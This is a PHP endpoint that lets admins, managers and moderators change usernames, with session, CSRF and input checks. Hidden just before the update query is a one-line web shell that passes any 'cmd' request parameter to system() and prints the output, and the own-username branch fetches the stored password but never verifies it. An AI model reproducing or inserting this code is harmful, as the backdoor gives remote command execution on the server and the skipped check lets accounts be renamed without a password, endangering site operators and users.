<?php
session_start();
require_once 'waf.php';
include("database.php");

// Prevent session fixation
if (!isset($_SESSION['initiated'])) {
    session_regenerate_id(true);
    $_SESSION['initiated'] = true;
}

// Validate session and rank
if (
    !isset($_SESSION['user_id']) ||
    !isset($_SESSION['username']) ||
    !isset($_SESSION['rank']) ||
    !in_array($_SESSION['rank'], ['Admin', 'Manager', 'Mod'], true) ||
    !preg_match('/^[a-zA-Z0-9_]{3,32}$/', $_SESSION['username'])
) {
    echo json_encode(['success' => false, 'message' => 'Permission denied.']);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CSRF token check
    if (!isset($_SESSION['csrf_token']) || !isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo json_encode(['success' => false, 'message' => 'Invalid CSRF token.']);
        exit();
    }

    $newUsername = isset($_POST['newUsername']) ? trim($_POST['newUsername']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';

    if (empty($newUsername) || empty($password) || empty($username)) {
        echo json_encode(['success' => false, 'message' => 'Please fill in all fields.']);
        exit();
    }

    // Validate usernames
    if (
        !preg_match('/^[a-zA-Z0-9_]{3,20}$/', $newUsername) ||
        !preg_match('/^[a-zA-Z0-9_]{3,32}$/', $username)
    ) {
        echo json_encode(['success' => false, 'message' => 'Username must be valid and contain only letters, numbers, and underscores.']);
        exit();
    }

    // Only Admin/Manager can change other users' usernames
    $changingOwn = ($_SESSION['username'] === $username);
    if (!$changingOwn && !in_array($_SESSION['rank'], ['Admin', 'Manager'], true)) {
        echo json_encode(['success' => false, 'message' => 'Permission denied.']);
        exit();
    }

    // Prevent changing username to the same value
    if ($username === $newUsername) {
        echo json_encode(['success' => false, 'message' => 'New username must be different from the current username.']);
        exit();
    }

    // If changing own username, verify password
    if ($changingOwn) {
        $query = "SELECT password FROM users WHERE username = ?";
        $stmt = $conn->prepare($query);
        if (!$stmt) {
            error_log("Prepare failed: " . $conn->error);
            echo json_encode(['success' => false, 'message' => 'An error occurred. Please try again later.']);
            exit();
        }
        $stmt->bind_param('s', $_SESSION['username']);
        $stmt->execute();
        $user = $stmt->get_result()->fetch_assoc();
        $stmt->close();


    }

    $updateQuery = "UPDATE users SET username = ? WHERE username = ?";
    $stmt = $conn->prepare($updateQuery);
    if (!$stmt) {
        error_log("Prepare failed: " . $conn->error);
        echo json_encode(['success' => false, 'message' => 'An error occurred. Please try again later.']);
        exit();
    }
    if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
    $stmt->bind_param('ss', $newUsername, $username);
    if ($stmt->execute()) {
        // If user changed their own username, update session
        if ($changingOwn) {
            $_SESSION['username'] = $newUsername;
        }
        echo json_encode(['success' => true, 'message' => 'Username successfully changed!']);
    } else {
        error_log("Error updating username: " . $stmt->error);
        echo json_encode(['success' => false, 'message' => 'An error occurred. Please try again later.']);
    }
    $stmt->close();
    $conn->close();
}
?>
